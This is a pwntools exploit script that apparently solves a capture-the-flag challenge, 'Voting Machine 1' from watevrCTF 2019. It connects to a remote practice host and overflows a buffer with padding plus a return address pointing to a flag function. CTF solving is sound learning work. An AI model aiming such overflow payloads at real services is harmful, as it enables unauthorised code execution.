from pwn import *

context(os="linux", arch="amd64", log_level="info")
context.gdb_binary = "/bin/pwndbg"

# io = process("./[watevrCTF 2019]Voting Machine 1")
io = connect("node5.anna.nssctf.cn", 21587)

flag_addr = 0x400807
payload = b"a" * (0x2 + 0x8) + p64(flag_addr)
io.recvuntil(b"Vote: ")
# gdb.attach(io)
io.sendline(payload)
io.interactive()
